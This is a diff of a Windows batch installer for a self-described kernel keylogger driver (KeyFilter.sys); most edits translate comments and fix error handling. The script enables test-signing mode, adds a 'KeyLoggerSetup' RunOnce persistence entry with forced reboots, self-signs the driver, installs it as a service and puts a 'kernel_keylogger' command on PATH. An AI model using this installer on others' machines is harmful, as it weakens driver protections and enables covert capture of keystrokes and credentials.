@@ -17,7 +17,7 @@ echo  =========================================
 echo.
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 0: 관리자 권한
+:: STEP 0: Admin check
 :: ────────────────────────────────────────────────────────────────
 call :step 0 8 "관리자 권한 확인"
 net session >nul 2>&1
@@ -28,7 +28,7 @@ if errorlevel 1 (
 call :ok
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 1: 테스트 서명 모드
+:: STEP 1: Test signing mode
 :: ────────────────────────────────────────────────────────────────
 call :step 1 8 "테스트 서명 모드 확인"
 bcdedit 2>nul | findstr /i "testsigning" | findstr /i "yes" >nul 2>&1
@@ -43,12 +43,12 @@ if not errorlevel 1 (
     call :ok "활성화 완료 -- 5초 후 재부팅, 재부팅 후 자동 재실행"
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
         /v "KeyLoggerSetup" /t REG_SZ /d "cmd /c \"%~f0\"" /f >nul 2>&1
-    shutdown /r /t 5 /c "testsigning 적용을 위한 재부팅"
+    shutdown /r /t 5 /c "testsigning reboot"
     exit /b 0
 )
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 2: Python 설치
+:: STEP 2: Python
 :: ────────────────────────────────────────────────────────────────
 call :step 2 8 "Python 확인 및 설치"
 python --version >nul 2>&1
@@ -74,7 +74,7 @@ if errorlevel 1 (
 
 :pip_install
 :: ────────────────────────────────────────────────────────────────
-:: STEP 3: pip 패키지 설치
+:: STEP 3: pip
 :: ────────────────────────────────────────────────────────────────
 call :step 3 8 "pip 패키지 설치"
 python -m pip install --upgrade pip --quiet 2>nul
@@ -89,11 +89,10 @@ if errorlevel 1 (
 call :ok "Python 모듈 검증 완료"
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 4: Visual Studio 2022 + WDK 자동 설치
+:: STEP 4: VS2022 + WDK
 :: ────────────────────────────────────────────────────────────────
 call :step 4 8 "Visual Studio 2022 + WDK 확인 및 설치"
 
-:: VS2022 확인 (없으면 설치)
 call :find_msbuild
 if not defined MSBUILD (
     echo         VS2022 없음 -- winget 으로 자동 설치 중... (수분 소요)
@@ -113,14 +112,13 @@ if not defined MSBUILD (
     call :ok "VS2022 이미 설치됨"
 )
 
-:: WDK VS 통합 확인 (WindowsKernelModeDriver10.0 툴셋 존재 여부)
 call :check_wdk_vs
 if "!WDK_VS_OK!"=="1" (
     call :ok "WDK VS 통합 이미 됨 -- 건너뜀"
     goto :build
 )
 
-:: WDK 바이너리 설치 여부 확인 (이미 설치됐으면 다운로드/설치 스킵)
+:: WDK binary check (makecert.exe = WDK installed)
 set WDK_BIN_OK=0
 for /d %%v in ("%ProgramFiles(x86)%\Windows Kits\10\bin\10.*") do (
     if exist "%%v\x64\makecert.exe" set WDK_BIN_OK=1
@@ -144,60 +142,58 @@ if "!WDK_BIN_OK!"=="0" (
     call :ok "WDK 이미 설치됨 -- VS 통합만 재시도"
 )
 
-:: WDK.vsix → VSIXInstaller 로 VS2022 통합
 call :install_wdk_vsix
 
-:: 통합 재확인
-call :check_wdk_vs
-if "!WDK_VS_OK!"=="1" (
+:: VSIX installed OK (exit code 0) -> trust it, proceed to build
+if "!VSIX_OK!"=="1" (
     reg delete "%REG_KEY%" /v "WDKRebootDone" /f >nul 2>&1
-    call :ok "WDK VS 통합 완료"
     goto :build
 )
 
-:: VSIX 파일 자체를 못 찾은 경우 → 재부팅해도 소용없음, 즉시 에러
+:: VSIX file not found -> reboot won't help
 if "!VSIX_NOT_FOUND!"=="1" (
     reg delete "%REG_KEY%" /v "WDKRebootDone" /f >nul 2>&1
-    call :fail "WDK.vsix 파일을 찾을 수 없음 -- WDK를 수동 재설치하세요"
+    call :fail "WDK.vsix 파일 없음 -- WDK 수동 재설치 필요"
     echo.
-    echo         설치 경로 확인:  dir "%ProgramFiles(x86)%\Windows Kits\10\vsix\" /s /b
     echo         수동 설치: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
     echo.
     pause & exit /b 1
 )
 
-:: WDK를 이미 설치된 상태에서 VSIX 적용이 안 됐으면 재부팅해도 소용없음
+:: VSIX found but installer failed
+:: If WDK was already installed (not just now), reboot won't help
 if "!WDK_JUST_INSTALLED!"=="0" (
     reg delete "%REG_KEY%" /v "WDKRebootDone" /f >nul 2>&1
-    call :fail "WDK VS 통합 실패 -- VSIXInstaller 오류"
-    echo         WDK 수동 재설치: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
+    call :fail "VSIXInstaller 실패 -- WDK 수동 재설치 필요"
+    echo.
+    echo         수동 설치: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
+    echo.
     pause & exit /b 1
 )
 
-:: WDK를 방금 설치했는데 통합 안 됨 → 재부팅으로 해결 가능
-:: 재부팅 플래그 확인 (이미 재부팅했으면 무한 루프 방지)
+:: WDK just installed + VSIX failed -> try reboot once
 reg query "%REG_KEY%" /v "WDKRebootDone" >nul 2>&1
 if not errorlevel 1 (
     reg delete "%REG_KEY%" /v "WDKRebootDone" /f >nul 2>&1
     call :fail "재부팅 후에도 WDK VS 통합 실패 -- WDK 수동 재설치 필요"
+    echo.
     echo         수동 설치: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
+    echo.
     pause & exit /b 1
 )
 
-:: 첫 재부팅: 플래그 기록 후 재부팅
 call :warn "WDK VS 통합 적용을 위해 재부팅 필요 -- 5초 후 자동 재부팅"
 reg add "%REG_KEY%" /v "WDKRebootDone" /t REG_SZ /d "1" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
     /v "KeyLoggerSetup" /t REG_SZ /d "cmd /c \"%~f0\"" /f >nul 2>&1
 timeout /t 5 /nobreak >nul
-shutdown /r /t 0 /c "WDK VS 통합 적용을 위한 재부팅"
+shutdown /r /t 0 /c "WDK VS integration reboot"
 exit /b 0
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 5: 드라이버 빌드
+:: STEP 5: Build driver
 :: ────────────────────────────────────────────────────────────────
 :build
-:: WDK 재부팅 플래그 정리 (정상 진행됐으므로)
 reg delete "%REG_KEY%" /v "WDKRebootDone" /f >nul 2>&1
 
 call :step 5 8 "드라이버 빌드"
@@ -224,7 +220,7 @@ copy /y "%DRIVER_SRC%\bin\KeyFilter.sys" "%DRIVER_SYS%" >nul
 call :ok "KeyFilter.sys 생성 완료"
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 6: 드라이버 서명
+:: STEP 6: Sign driver
 :: ────────────────────────────────────────────────────────────────
 :sign
 call :step 6 8 "드라이버 서명 (테스트 인증서)"
@@ -243,7 +239,6 @@ if not defined MAKECERT (
     goto :install_driver
 )
 
-:: 이미 서명됐으면 스킵
 "%SIGNTOOL%" verify /pa "%DRIVER_SYS%" >nul 2>&1
 if not errorlevel 1 (
     call :ok "이미 서명됨 -- 건너뜀"
@@ -268,11 +263,10 @@ if errorlevel 1 (
 
 :install_driver
 :: ────────────────────────────────────────────────────────────────
-:: STEP 7: 드라이버 설치 및 시작
+:: STEP 7: Install driver
 :: ────────────────────────────────────────────────────────────────
 call :step 7 8 "드라이버 설치"
 
-:: 이미 RUNNING 중이면 재설치 건너뜀
 sc query %SERVICE% 2>nul | findstr /i "RUNNING" >nul 2>&1
 if not errorlevel 1 (
     call :ok "드라이버 이미 실행 중 -- 건너뜀"
@@ -308,7 +302,7 @@ if errorlevel 1 (
 
 :step8
 :: ────────────────────────────────────────────────────────────────
-:: STEP 8: PATH 등록
+:: STEP 8: PATH
 :: ────────────────────────────────────────────────────────────────
 call :step 8 8 "kernel_keylogger 명령 PATH 등록"
 echo %PATH% | findstr /i "%ROOT:~0,-1%" >nul 2>&1
@@ -319,9 +313,6 @@ if errorlevel 1 (
     call :ok "이미 등록됨"
 )
 
-:: ────────────────────────────────────────────────────────────────
-:: 완료
-:: ────────────────────────────────────────────────────────────────
 echo.
 echo  =========================================
 echo    설치 완료!
@@ -345,10 +336,9 @@ pause
 goto :eof
 
 :: ────────────────────────────────────────────────────────────────
-:: 도우미 함수
+:: Subroutines
 :: ────────────────────────────────────────────────────────────────
 
-:: WDK VS 통합 여부 확인 → WDK_VS_OK 설정
 :check_wdk_vs
 set WDK_VS_OK=0
 for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
@@ -360,11 +350,10 @@ for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
 )
 goto :eof
 
-:: WDK.vsix 를 VSIXInstaller 로 VS2022 에 통합
 :install_wdk_vsix
+set VSIX_OK=0
 set VSIX_NOT_FOUND=0
 
-:: VSIXInstaller 탐색
 set VSIXINSTALLER=
 for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
     for %%e in (Community Professional Enterprise BuildTools) do (
@@ -375,29 +364,24 @@ for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
 )
 if not defined VSIXINSTALLER (
     call :warn "VSIXInstaller 없음 -- WDK VS 통합 건너뜀"
+    set VSIX_NOT_FOUND=1
     goto :eof
 )
 
-:: WDK.vsix 탐색 (경로 3단계로 확인)
 set WDK_VSIX=
-
-:: 1) flat 경로 (최신 WDK 10.0.26100+)
 if exist "%ProgramFiles(x86)%\Windows Kits\10\vsix\WDK.vsix" (
     set "WDK_VSIX=%ProgramFiles(x86)%\Windows Kits\10\vsix\WDK.vsix"
 )
-:: 2) vs17 하위폴더 (VS2022 전용 경로)
 if not defined WDK_VSIX (
     if exist "%ProgramFiles(x86)%\Windows Kits\10\vsix\vs17\WDK.vsix" (
         set "WDK_VSIX=%ProgramFiles(x86)%\Windows Kits\10\vsix\vs17\WDK.vsix"
     )
 )
-:: 3) 버전 번호 하위폴더 탐색
 if not defined WDK_VSIX (
     for /d %%v in ("%ProgramFiles(x86)%\Windows Kits\10\vsix\*") do (
         if exist "%%v\WDK.vsix" set "WDK_VSIX=%%v\WDK.vsix"
     )
 )
-:: 4) PowerShell 로 전체 하위 탐색 (위에서 못 찾은 경우 최후 수단)
 if not defined WDK_VSIX (
     for /f "usebackq delims=" %%f in (`powershell -NoProfile -Command ^
         "Get-ChildItem '%ProgramFiles(x86)%\Windows Kits\10' -Recurse -Filter 'WDK.vsix' 2>$null | Select-Object -First 1 -ExpandProperty FullName"`) do (
@@ -412,11 +396,15 @@ if not defined WDK_VSIX (
 )
 
 echo         WDK.vsix 발견: !WDK_VSIX!
-"%VSIXINSTALLER%" /q "!WDK_VSIX!" >nul 2>&1
-call :ok "WDK VS 통합 완료 (WindowsKernelModeDriver10.0)"
+"%VSIXINSTALLER%" /q "!WDK_VSIX!"
+if errorlevel 1 (
+    call :warn "VSIXInstaller 실패 (exit code: %ERRORLEVEL%)"
+) else (
+    set VSIX_OK=1
+    call :ok "WDK VS 통합 완료 (WindowsKernelModeDriver10.0)"
+)
 goto :eof
 
-:: MSBuild.exe 경로 탐색 → MSBUILD 설정
 :find_msbuild
 set MSBUILD=
 set VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe
